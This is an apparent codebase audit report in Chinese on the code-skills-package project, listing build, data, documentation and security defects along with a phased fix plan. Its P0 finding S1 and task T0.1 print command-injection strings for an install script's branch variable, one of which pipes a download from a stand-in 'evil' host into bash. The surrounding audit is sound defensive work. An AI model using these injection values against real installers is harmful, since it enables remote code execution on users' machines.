# code-skills-package (CSP) 项目综合审查报告（2026-08）

> 单一决策源文档：含三部分 —— ① 问题报告 ② 总体设计方案 ③ 技术升级方案。
> 审查基线：master `6fa72b7`（2026-08-11），最后发布 tag `v0.7.1`，仓库版本 `0.8.0`。
> 审查方法：5 维度全库审查（功能完整性 / 技术架构 / 数据管理 / 文档分发 / 工程质量与安全），5 个 Explore 代理并行调查 + 主线对全部 P0/P1 结论实机核验（npm run 实测、graph.json 节点/边计数、hooks-csp.json 引用解析、build-skpg.mjs 崩溃复现、validate:all exit code 实测、npm pack --dry-run 实测）。
> 审查执行：codebase-multidim-audit skill 方法论（Phase 0-4）。

---

# 第一部分：问题报告

## 1. 总体评估

| 维度 | 成熟度 | 一句话结论 |
|------|--------|-----------|
| ① 功能模块完整性 | **C（骨架可用有缺口）** | 585 skill 文件全部存在、内容完整率 >99%，但运行时管线（hooks 路由 / command→workflow 委托 / SDK 子命令）系统性断裂 |
| ② 技术架构 | **C+（概念清晰，脚手架脆弱）** | L0-L4 分层优秀、零运行时依赖属实，但 5 套元数据 SoT 模糊、build:all 只覆盖 40% 构建管线、God files（install.sh 1508 行 / csp-sdk.mjs 1101 行） |
| ③ 数据管理 | **C（原型向工程化过渡阵痛）** | registry.json 退化为手编数据、graph 运行时副本丢 63% 边、.bak 污染发布包、版本同步靠人工记忆 |
| ④ 文档/分发 | **C（宣称与实际多处错位）** | README 链接 404、SKILL-INDEX 仅覆盖 11% skill、install.sh 版本号滞后、npm pack 含 .bak |
| ⑤ 工程质量与安全 | **C（存在 P0 安全红线）** | CSP_BRANCH 命令注入可 RCE、测试以 stub pass 为主、CI 部分门禁失效、build:graph 当前崩溃 |

**核心判断（3 个系统性风险）**：

1. **"内容富集 vs 管线断裂"剪刀差** — 585 个 skill 素材质量 B 级，但把它们串成"自动路由 + 懒加载 + spec-driven"的运行时管线几乎全断（hooks 24/27 脚本缺失且未安装、L2 command→workflow 68/68 路径错、SDK 大量子命令 stub pass）。CSP 当前实质是"高质量 skill 素材库 + 未接通的路由框架"。
2. **"生成数据 vs 手编数据"SoT 模糊** — registry/triggers/graph 三大资产名义由脚本生成，实际 build-registry.mjs 路径错配无法运行、build-skpg.mjs 崩溃、triggers.yaml 是 generate+fix+手编混合产物。今天删掉 registry.json 没有任何脚本能从 skills 目录重建它——核心"可重建性"已丧失。
3. **"安全门面 > 安全实效"** — install.sh 有 CSP_BRANCH 校验注释和 case 防护，但只防了空格/分号/管道，`$()` 与 backtick 在双引号内照样展开 → RCE；.bak 文件经 npm pack 打入发布包；CI 的 `|| true` 绕过 uninstall 测试。

## 2. P0 级问题（安全红线，立即处理）

| # | 问题 | 位置 | 后果 | 核验状态 |
|---|------|------|------|----------|
| S1 | **CSP_BRANCH 命令注入可远程代码执行** | `install.sh:34-48` | 攻击者诱导 `CSP_BRANCH='master$(curl evil\|bash)' curl ... \| bash` 即可在 curl 之前执行任意命令（`$()` 和 backtick 在双引号字符串内被 bash 展开） | 【已实机核验】case 仅匹配空格/分号/管道，`$()`/反引号/`&`/换行均可通过 |
| S2 | **`.bak` 文件打入 npm 发布包** | `csp-router/triggers.yaml.bak` + `triggers.yaml.pre-gen.bak` | 发布包膨胀 96KB；旧版 triggers 逻辑可能被误读；专业度负面信号。`.bak` 在 git 中是 untracked，但因 `files:["csp-router"]` 整目录被打包 | 【已实机核验】`npm pack --dry-run` 列出两个 .bak 共 96.2KB |
| S3 | **运行时 graph 副本丢失 1372 条语义边** | `.csp/skpg/graph.json` | 安装到用户机器的运行时图只有 813 边（仅 contains+triggers），缺 775 depends_on + 597 related_to 边，graph-based 推理能力降级 63% | 【已实机核验】源 2185 边 vs 运行时 813 边，generated_at 相差 4 天 |
| S4 | **`build:graph` 构建脚本崩溃，graph 不可重建** | `scripts/build-skpg.mjs:253` | `for (const rel of fm.related_skills)` 在某 SKILL.md 的 related_skills 为非数组真值时抛 `TypeError: fm.related_skills is not iterable`。当前 graph.json 是冻结的历史产物，任何 skill 增删都无法重建 | 【已实机核验】`npm run build:graph` 直接抛 TypeError 退出 |

## 3. 各维度问题

### 3.1 功能模块完整性

#### 3.1.1 hooks-csp.json 引用 24 个不存在脚本，且从未被 install.sh 安装【P1，已实机核验】
- **位置**：`shared/hooks/hooks-csp.json`
- **证据**：定义 10 个 hook 事件、引用 27 个脚本，其中 24 个走 `$CLAUDE_PLUGIN_ROOT/scripts/*.mjs` 路径（keyword-detector / skill-injector / session-start / pre-tool-enforcer / permission-handler / post-tool-verifier / verify-deliverables / context-guard-stop / persistent-mode / code-simplifier / session-end 等），这些文件在 `scripts/` 与 `shared/scripts/` 均不存在。仅 state-detector.mjs / confidence-router.mjs / 3 个 learning-loop-*.mjs 真实存在。`grep -n hooks-csp install.sh` 返回空——该配置从未被安装到用户环境。
- **后果**：README/ARCHITECTURE 宣称的 "state-detector → keyword-detector → confidence-router → skill-injector" 自动路由管线在用户环境完全不工作。整个 hook 驱动自动化是纸面设计。

#### 3.1.2 L2 command→workflow 委托链全量断链（68/68 路径错）【P1，已实机核验】
- **位置**：`csp-workflow/commands/*.md`（55/73 个含 `@execution_context` 引用）
- **证据**：所有 `@` 引用用硬编码 `@~/.claude/code-skills-package/csp-workflow/workflows/<name>.md`，双重错误：① 基础路径错（install.sh 装到 `.claude/skills/csp-workflow/`，非 `~/.claude/code-skills-package/`）；② 文件名错（引用 `workflows/ship.md`，实际是 `workflows/csp-ship.md`）。实测 `csp-add-tests.md` → `@.../workflows/add-tests.md`，实际文件是 `csp-add-tests.md`。
- **后果**：`/csp-ship`、`/csp-review`、`/csp-debug` 等核心工作流入口无法加载对应 workflow，AI 静默失败或幻觉。

#### 3.1.3 package.json 3 个 npm script 路径错配 → build:all 不可用【P1，已实机核验】
- **位置**：`package.json:scripts`
- **证据**：`build:registry` / `build:page` / `verify:graph` 指向 `scripts/build-registry.mjs` 等，但文件实际在 `shared/scripts/`。`scripts/` 目录 15 个文件中无这三个。`npm run build:registry` 报 `MODULE_NOT_FOUND`；`build:all` 链式调用 build:registry → 立即失败。
- **后果**：CI/CD 或开发者执行构建流水线直接报错。

#### 3.1.4 csp-sdk.mjs 对未实现/未知子命令返回 success（stub pass）【P1，已实机核验】
- **位置**：`bin/csp-sdk.mjs:938-953, 1098` 等
- **证据**：`verify.key-links`/`verify.plan-structure`/`verify.schema-drift` 返回 `{status:'pass'}` 含空数据；`sub.startsWith('verify.')||sub.startsWith('validate.')` 一律 pass；`sub.startsWith('check.')` 返回 `coverage:1.0`；末尾 fallback `return {status:'ok', _note:'Unhandled...returning default success'}`。共 12 个 `{status:'ok'}` 桩 + 5 个 `{status:'pass'}` 桩。
- **后果**：调用方无法区分"成功"与"未实现"。AI agent 调用 verify.* 得到的"通过"毫无意义，自动化故障被完全掩盖。

#### 3.1.5 SKILL-INDEX.md 根目录不存在但 README 引用为技能索引入口【P1，已实机核验】
- **位置**：`README.md:7` badge + `README.md:147` Further Reading 表
- **证据**：README 两处 `[SKILL-INDEX.md](./SKILL-INDEX.md)` 指向根目录，但文件只在 `docs/SKILL-INDEX.md`（44748B，标注 v0.7.0 / 2026-06-20）。
- **后果**：README 两处关键链接 404。

#### 3.1.6 reference 断链 113 处，波及 62 个 skills（10.6%）【P2】
- **证据**：267 个相对 `.md` 引用中 113 个断链（42.3%），L2 最严重（79 处）。重灾区：`csp-plan-checker.md`（6 断链）、`csp-phase-researcher.md`（5）、`csp-sketch.md`（5）。
- **后果**：AI 加载这些 skill 后读 reference 失败，按需加载核心机制受损。

#### 3.1.7 6 个 scripts 完全无入口调用（孤儿脚本）【P2】
- **证据**：`build-skpg-edges.mjs`、`fix-triggers.mjs`、`learning-loop-merge.mjs`、`rebuild-skpg-index.mjs`、`token-budget.mjs`、`visualize-workflow.js` 不在 package.json scripts、不被其他脚本 import、不在 install.sh、不在 CI。但其中 build-skpg-edges 生产的 depends_on/related_to 边确实存在于 committed graph（说明曾被手动跑过）。
- **后果**：~49KB 死代码 + 关键构建步骤（语义边、index 重建）未接入 build:all → build:all 产出残缺 graph。

#### 3.1.8 63 个 review 类 skill 职责重叠【P2】
- **证据**：`csp-adversarial-reviewer`(agent) vs `csp-review-adversarial`(review-tools)；`csp-code-reviewer` 在 patterns/agents(deprecated) + runtime/agents + patterns/skills/csp-code-review 三处；security 类 13 个（csp-security-reviewer/csp-security-review/csp-security-auditor 高度重叠）。
- **后果**：路由置信度分散，用户困惑于用哪个。

#### 3.1.9 V2 frontmatter 合规率仅 6.5%（38/585）【P2】
- **证据**：CHANGELOG v0.7.0 宣称"Top 20 升级 v2"，当前含 phase+domain 的仅 38 个，547 个仍 V1。
- **后果**：confidence-router 依赖 V2 元数据做 phase/domain 评分，83%+ skill 降级为纯关键词匹配。

### 3.2 技术架构

#### 3.2.1 5 套元数据来源，SoT 模糊【P0→P1】
- **位置**：`registry.json` / `triggers.yaml` / `skill-metadata.yaml` / `skpg/graph.json` / `SKILL.md` frontmatter
- **证据**：registry.json 由（缺失的）build-registry 从 SKILL.md 生成；triggers.yaml 由 generate-triggers 追加 + 人工编辑混合；skill-metadata.yaml 由 build-skill-metadata 从 frontmatter 提取；graph.json 由 build-skpg + build-skpg-edges 四源合并。triggers.yaml 是半自动半手动产物。
- **后果**：任何元数据格式变更需同步多处；triggers.yaml 生成后又手改的修改会被后续 generate 覆盖风险。

#### 3.2.2 build:all 严重不完整（只覆盖 40% 构建管线）【P1，已实机核验】
- **位置**：`package.json:scripts.build:all`
- **证据**：`build:all = build:registry && build:graph && build:page`。缺失 generate-triggers、build-skpg-edges、build-skill-metadata、rebuild-skpg-index 四步。且 build:registry 路径错（见 3.1.3）、build:graph 崩溃（见 S4）。
- **后果**：新贡献者跑 build:all 得到残缺产物。

#### 3.2.3 God files：install.sh 1508 行 / csp-sdk.mjs 1101 行【P1】
- **证据**：install.sh 47KB 承载 18 平台检测+安装+卸载+bootstrap+远程下载，28 处 `2>/dev/null`、11 处 `|| true`；csp-sdk.mjs 1101 行，routeQuery 是 ~340 行 if/else 链。
- **后果**：无法单元测试，调试困难，版本号漂移表明维护脱节。

#### 3.2.4 100% registry.triggers.keywords 为空 + 40% SKILL.md description 为空【P1】
- **证据**：585/585 条 registry.triggers.keywords 为 `[]`（死字段）；88/218 SKILL.md description 为空。
- **后果**：registry.triggers 字段误导消费者；描述质量参差。

#### 3.2.5 三套独立 YAML parser 行为不一致【P2】
- **证据**：`parseSimpleYaml` 在 build-skpg.mjs / validate-skill-v2.mjs / build-skill-metadata.mjs 各实现一次，不支持引号内冒号、锚点、合并键。
- **后果**：同一 frontmatter 在不同脚本里解析结果可能不同。

#### 3.2.6 8 个 skill 命名违规（非 csp- 前缀）【P3】
- **证据**：`golang-patterns`/`python-testing`/`kotlin-testing`/`kotlin-patterns`/`webapp-testing`/`python-patterns`/`golang-testing`/`cursor-rules` 违反 SKILL-AUTHORING.md "starts with csp-" 规定。

### 3.3 数据管理

#### 3.3.1 graph.json 584 vs registry 585，csp-tech-diagram 丢失【P1，已实机核验】
- **位置**：`csp-router/skpg/graph.json` stats.skill_count=584
- **证据**：csp-tech-diagram 在 registry.json（path 存在，文件存在），但 `JSON.stringify(graph)` 不含 "csp-tech-diagram"。
- **后果**：knowledge graph 查询永远找不到这个 skill；router graph-based 路由对它失效。

#### 3.3.2 SKILL-INDEX.md 仅覆盖 67/585（11%），标注 v0.7.0【P1】
- **证据**：头部"生成时间 2026-06-20 版本 v0.7.0"，正文仅 67 个唯一 csp-* 名称，522 个 skill（89%）未索引。
- **后果**：开发者无法通过文档了解技能全貌。

#### 3.3.3 triggers.yaml 生成+手编混合工作流无保护【P1】
- **位置**：`csp-router/triggers.yaml` + `triggers.yaml.bak`(47KB) + `triggers.yaml.pre-gen.bak`(48KB)
- **证据**：generate-triggers.mjs 备份到 .pre-gen.bak 并覆写；fix-triggers.mjs 备份到 .bak 并覆写，且会 `comment out` 无法解析的引用（L215），可能误杀手编有效条目。两个 .bak diff 752 行。
- **后果**：手编修改可能被后续生成覆盖或被 fix-triggers 误杀。

#### 3.3.4 registry/graph/metadata 三大资产无 schema 校验【P1】
- **证据**：grep schema/zod/ajv 零命中。validate-triggers 只查 broken refs + duplicate keys，不验 trigger regex 合法性。
- **后果**：结构错误只能运行时暴露。

#### 3.3.5 install.sh VERSION=0.7.1 滞后 + sync-version 未入 CI【P1，已实机核验】
- **证据**：install.sh:17 `readonly VERSION="0.7.1"`、CLAUDE.md 标题 v0.7.1，而 VERSION/package.json/README badge=0.8.0。sync-version.js 逻辑正确（V25 确认 targets 含 install.sh），但未在 release/CI 流程强制执行。CHANGELOG.md 无 0.8.0 条目，Unreleased 仅 csp-tech-diagram 一条。
- **后果**：安装脚本报告错误版本；0.8.0 变更未归档。

#### 3.3.6 .csp/state.json / budget.json 无 schema 守卫【P2】
- **证据**：csp-sdk.mjs 直接 writeFile，无校验。SDK 升级改 state 结构可能导致旧 state 崩溃。

### 3.4 文档/分发

#### 3.4.1 README quickstart 命令版本号与实际不一致 + 链接 404【P1】
- **证据**：README badge 0.8.0 但示例命令可能引用 0.7.1；SKILL-INDEX.md 根目录链接 404（见 3.1.5）。CHANGELOG 最新 release v0.7.1，0.8.0 变更未归档。

#### 3.4.2 18 平台宣称 vs 实际 — 基本属实【✅ 已核验】
- **证据**：install.sh ALL_PLATFORMS 18 个，逐一核查均有 dir/detect/bootstrap 逻辑实现。宣称属实。
- **正面**：平台支持是真实功能。

#### 3.4.3 docs/csp-page 构建产物不明【P2】
- **证据**：build-page.mjs 在 shared/scripts/（路径错配），未实测能否运行；csp-page/ 产物是否 commit 进仓库待定。

### 3.5 工程质量与安全

#### 3.5.1 validate:all 当前对 csp-runtime 失败（CI 红）【P1，已实机核验】
- **位置**：`csp-runtime/skills/csp-hud/SKILL.md` frontmatter `scope: ~/.claude/**`
- **证据**：`node scripts/validate-skill-v2.mjs csp-runtime/skills` exit=1（V22 确认），报告 `Fail: 1 | ERROR: Invalid scope: ~/.claude/** (valid: implementation, review, analysis, design, testing)`。即 `npm test` / `npm run validate:all` 当前在 master 上是红的。
- **后果**：CI 在 PR 上会失败；或 CI 已被绕过。csp-hud 把文件路径误填进 scope 枚举字段。

#### 3.5.2 CI test-install.yml 用 `|| true` 吞掉 uninstall/dry-run 失败【P1】
- **位置**：`.github/workflows/test-install.yml:24,31`
- **证据**：`--uninstall --target . || true`、`--dry-run || bash ...`（dry-run 失败回退真安装，违背 dry-run 初衷）。
- **后果**：卸载/安装功能退化不会被 CI 发现。

#### 3.5.3 install.sh trap 在 exec 后丢失【P2】
- **位置**：`install.sh:32-33, 48`
- **证据**：`trap 'rm -rf "$_csp_tmp"' EXIT` 后 `exec bash ...`。exec 替换进程，新进程不继承 trap。re-exec 脚本中途 crash 则 `$_csp_tmp` 残留（含完整 repo + .git）。
- **后果**：/tmp 信息泄露 + 磁盘占用。

#### 3.5.4 下载无完整性校验【P1】
- **位置**：`install.sh:43-47`
- **证据**：注释承认"Users should verify integrity"但代码无 SHA256/GPG/signature。HTTPS（✅ 非 HTTP），但 MITM + GitHub compromise = 供应链攻击面。

#### 3.5.5 --uninstall 无确认直接 rm -rf layer 目录【P2】
- **位置**：`install.sh:993-1002`
- **证据**：`rm -rf "$target_dir/$layer"` 循环删五层。若 `--target` 误指项目根且恰好有同名子目录会被删。仅删 CSP_LAYERS 命名子目录（缓解）。
- **后果**：误操作风险。

#### 3.5.6 关键路径零断言级测试【P2】
- **证据**：无 test/ 目录、无 *.test.mjs、无 assert。Router 路由正确性、graph 构建、triggers 生成均无单元测试。`csp-sdk doctor` 是自引用健康检查（只查 .planning/.csp/.git 存在），不验证产品质量。

#### 3.5.7 memory-persistence hooks 引用不存在脚本【P2】
- **位置**：`shared/hooks/memory-persistence/hooks.json`
- **证据**：引用 session-start.js / pre-compact.js / observe-runner.js 等，文件不存在于本仓库（仅在 `开源项目参考/ECC/`）。

#### 3.5.8 无本地 lint 门禁【P1】
- **证据**：无 .pre-commit-config / .husky / eslint / prettier / shellcheck 本地配置。CI 有 shellcheck 但忽略 SC2086 等。47KB bash 完全靠人工审查。

#### 3.5.9 工程残留【P2-P3】
- `开源项目参考/` 16 个第三方项目副本（.gitignore 已忽略，但 clone 拖慢）。
- `.planning/` / `.csp/` / `.superpowers/` / `.claude/` 存在于工作树（.gitignore 已忽略，npm pack 未含——安全，但对新贡献者困惑）。

---

# 第二部分：总体设计方案

## 1. 目标架构

```
┌─ source-of-truth (手写，唯一真相源) ──────────────────────┐
│  csp-{layer}/skills/csp-{name}/SKILL.md  (frontmatter v2) │
│  csp-router/state-config.yaml  (手写路由规则)              │
└─────────────────────────┬─────────────────────────────────┘
                          │ 单向派生（build:all 一键重建）
                          ▼
┌─ derived (生成数据，禁止手编，.gitignore 可选) ───────────┐
│  registry.json   ← build-registry (从 SKILL.md frontmatter) │
│  triggers.yaml    ← generate-triggers (从 registry + 规则)   │
│  skill-metadata.yaml ← build-skill-metadata (从 frontmatter)│
│  skpg/graph.json  ← build-skpg (registry+metadata+triggers) │
│  skpg/index.json  ← rebuild-skpg-index (从 graph)           │
│  docs/SKILL-INDEX.md ← build-page (从 registry)             │
└─────────────────────────┬─────────────────────────────────┘
                          │ install.sh 安装时复制
                          ▼
┌─ runtime (用户机器，per-session) ─────────────────────────┐
│  .csp/state.json  .csp/budget.json  .csp/skpg/graph.json  │
└────────────────────────────────────────────────────────────┘
```

**核心原则**：SKILL.md frontmatter 是唯一 SoT；所有生成数据由 `build:all` 一键重建；生成数据禁止手编；.bak 机制改为生成到 `.bak/` 子目录并 .gitignore + .npmignore。

## 2. 核心设计决策

| 决策 | 选项 | 推荐 | 理由 |
|------|------|------|------|
| CSP_BRANCH 校验 | 黑名单 case | **白名单正则 `^[A-Za-z0-9._-]+$`** | 黑名单漏 `$()`/backtick；白名单从根本消除注入 |
| .bak 处理 | 留 csp-router/ | **移入 .gitignored `.bak/` + npmignore `*.bak`** | 不污染 git/npm，保留本地回滚 |
| build:all 完整性 | 现状 3 步 | **7 步全链：registry→metadata→triggers→skpg→edges→index→page** | 单命令重建全部派生数据 |
| 元数据 SoT | 5 套混合 | **SKILL.md frontmatter 唯一源** | 单点修改，自动派生 |
| csp-sdk stub | 静默 pass | **未实现子命令返回 `status:'unimplemented'` + exit 1** | 调用方可区分 |
| hooks 管线 | 24 脚本缺失 | **二选一：补齐脚本 OR 删 hooks-csp.json + 文档降级为"手动路由"** | 不留半接线 |
| L2 command 委托 | 硬编码绝对路径 | **相对引用 `@csp-workflow/workflows/csp-{name}.md` + 安装期改写** | 路径无关 |
| graph 重建 | build-skpg 崩溃 | **修 `related_skills` 非数组守卫 + 接入 build:all** | 恢复可重建性 |
| 版本同步 | 手动跑 sync-version | **pre-commit hook + CI 校验 `node scripts/check-version-sync.js`** | 杜绝漂移 |

## 3. 数据流设计

**新增 skill 流程（目标态）**：
1. `csp-sdk init-skill csp-{name} --layer {L}` → scaffold SKILL.md（v2 frontmatter 模板）
2. 写正文
3. `npm run build:all` → 一键重建 registry/triggers/metadata/graph/index/SKILL-INDEX
4. `npm run validate:all` → 全绿
5. git commit（pre-commit 自动跑 sync-version + validate）

## 4. 接口契约

- **SKILL.md frontmatter v2**（强制）：name / description / layer / category / phase / domain / tools / scope(枚举) / deprecated(bool) / related_skills(array)
- **csp-sdk exit code**：0=成功实现，1=错误，2=未实现（新语义，替换 stub pass）
- **build 脚本 exit code**：任何输入解析失败必须 exit 1（替换静默 warn）

---

# 第三部分：技术升级方案

## P0 阶段（1-2 周）：安全修复 + 门禁恢复

| 任务 | 具体动作 | 验收标准 |
|------|----------|----------|
| T0.1 CSP_BRANCH 白名单 | install.sh:34 case 改为 `[[ "$_csp_branch" =~ ^[A-Za-z0-9._-]+$ ]] \|\| { echo error >&2; exit 1; }` | `CSP_BRANCH='master$(id)' bash install.sh --dry-run` 拒绝并 exit 1；合法分支通过 |
| T0.2 排除 .bak 出 npm 包 | package.json files 改为显式列表，或加 `.npmignore` 含 `*.bak` | `npm pack --dry-run` 不再列出任何 .bak |
| T0.3 修 build-skpg.mjs 崩溃 | line 253 `if (fm.related_skills && Array.isArray(fm.related_skills))` | `npm run build:graph` exit 0，graph.json 重建后边数 ≥2185 |
| T0.4 修 csp-hud scope | `csp-runtime/skills/csp-hud/SKILL.md` frontmatter scope 改为合法枚举值 | `npm run validate:all` exit 0 |
| T0.5 同步版本号 | `node scripts/sync-version.js` 把 install.sh/CLAUDE.md 同步到 0.8.0；归档 CHANGELOG 0.8.0 | grep 0.7.1 在 install.sh/CLAUDE.md 零命中 |
| T0.6 .csp/skpg 同步 | install.sh 安装时 `cp csp-router/skpg/graph.json .csp/skpg/` | 安装后两文件 `diff` 为空 |

## P1 阶段（2-4 周）：核心债务清理

| 任务 | 具体动作 | 验收标准 |
|------|----------|----------|
| T1.1 修 build:all 路径 | package.json build:registry/build:page/verify:graph 改指 shared/scripts/ | `npm run build:all` exit 0 |
| T1.2 build:all 全链 | build:all 改为 7 步：registry→metadata→generate-triggers→fix-triggers→skpg→skpg-edges→rebuild-index→page | 删 registry.json 后 `npm run build:all` 能从 SKILL.md 重建全部派生数据 |
| T1.3 修 csp-sdk stub | verify.*/validate.*/check.* 未实现子命令返回 `{status:'unimplemented'}` + exit 2；fallback 改 exit 1 | `csp-sdk query verify.xxx; echo $?` = 2 |
| T1.4 修 L2 command 委托 | commands/*.md 的 `@~/.claude/code-skills-package/...workflows/<n>.md` 改为 `@csp-workflow/workflows/csp-<n>.md`；安装期改写路径 | 抽样 10 个 command，引用文件全部存在 |
| T1.5 SKILL-INDEX 重建 | build-page.mjs 从 registry 生成 docs/SKILL-INDEX.md；README 链接改 `./docs/SKILL-INDEX.md` | SKILL-INDEX 含 585 条，根目录链接 200 |
| T1.6 graph 补 csp-tech-diagram | 修 build-skpg 后重跑 build:all，确认 graph.skill_count=585 | `JSON.stringify(graph).includes('csp-tech-diagram')` = true |
| T1.7 hooks 管线决策 | 补齐 24 个缺失 hook 脚本（从开源项目参考/ECC 移植）OR 删 hooks-csp.json 并 README 降级为"手动路由" | hooks-csp.json 引用 100% 存在，或文件已删 |
| T1.8 CI 门禁收紧 | test-install.yml 去掉 `|| true`；新增 version-sync check job | uninstall 失败时 CI 红；版本不同步时 CI 红 |
| T1.9 修 reference 断链 | 跑脚本扫 113 断链，逐个修路径或补文件 | 断链数 < 10 |

## P2 阶段（1-2 月）：架构优化

| 任务 | 具体动作 | 验收标准 |
|------|----------|----------|
| T2.1 拆 install.sh | 按职责拆为 install.sh(主) + lib/platforms.sh + lib/bootstrap.sh + lib/uninstall.sh | 各文件 < 500 行；shellcheck 零警告 |
| T2.2 拆 csp-sdk.mjs | routeQuery if/else 链重构为子命令注册表（Map） | 单文件 < 600 行；新增子命令不改主流程 |
| T2.3 统一 YAML parser | 抽 shared/scripts/lib/yaml.mjs，三脚本共用 | grep parseSimpleYaml 仅 1 处定义 |
| T2.4 合并 build-skpg 三脚本 | build-skpg + build-skpg-edges + rebuild-skpg-index 合为单脚本三阶段 | build:all 调用点减 2 |
| T2.5 合并 review 类 skill | 63 个 review skill 去重，deprecated 的从 registry 标记或移除 | registry 中 deprecated=true 的不出现在路由候选 |
| T2.6 补 V2 frontmatter | 批量给 547 个 V1 skill 补 phase/domain 字段（基于 category 推断） | V2 合规率 ≥ 80% |
| T2.7 registry schema 校验 | 新增 scripts/validate-registry.mjs（JSON Schema） | 故意破坏 registry 字段 → exit 1 |
| T2.8 关键路径测试 | 新增 test/ 目录，覆盖 router 路由、triggers 生成、graph 构建 | `npm test` 含 ≥ 20 个真实断言 |

## P3 阶段（季度）：演进方向

| 任务 | 具体动作 | 验收标准 |
|------|----------|----------|
| T3.1 csp-sdk init-skill | scaffold 新 skill 的命令 | `csp-sdk init-skill csp-foo --layer patterns` 生成合规 SKILL.md |
| T3.2 csp-patterns 子分类 | 122 个扁平 skill 按语言/领域分子目录 | 目录有 ≤ 2 层分类 |
| T3.3 下载完整性校验 | install.sh 加 SHA256 校验 + .sha256 旁车文件 | 改坏下载内容 → 拒绝安装 |
| T3.4 graph lazy-load | skpg/graph.json 拆分按层加载，降低 L0 token | router 加载 token < 1000 |
| T3.5 CHANGELOG 自动化 | release 脚本从 commit 生成 CHANGELOG | tag → 自动 changelog 条目 |

---

## 附录

### 审查覆盖范围与局限性
- 覆盖：5 维度全库 + 全部 P0/P1 实机核验（npm run / graph 计数 / hooks 解析 / build 崩溃复现 / validate exit code / npm pack dry-run）。
- 局限：未对 585 个 skill 正文逐一审阅内容质量（抽样 ~75 个）；未真实在 18 平台安装测试；csp-page 构建产物未实跑（build-page.mjs 路径错配无法跑）。
- 审查执行者：codebase-multidim-audit skill（Phase 0 上下文装载 → Phase 1 五维并行 Explore 代理 → Phase 2 高危实机核验 → Phase 3 汇总 → Phase 4 反幻觉）。

### 反幻觉检查
报告出现的项目名/模块名/文件名均经 grep 确认真实存在：csp-router / csp-meta / csp-workflow / csp-patterns / csp-runtime / registry.json / triggers.yaml / skpg/graph.json / install.sh / bin/csp-sdk.mjs / scripts/build-skpg.mjs / shared/scripts/build-registry.mjs / csp-hud / csp-tech-diagram / hooks-csp.json / SKILL-INDEX.md 全部命中。
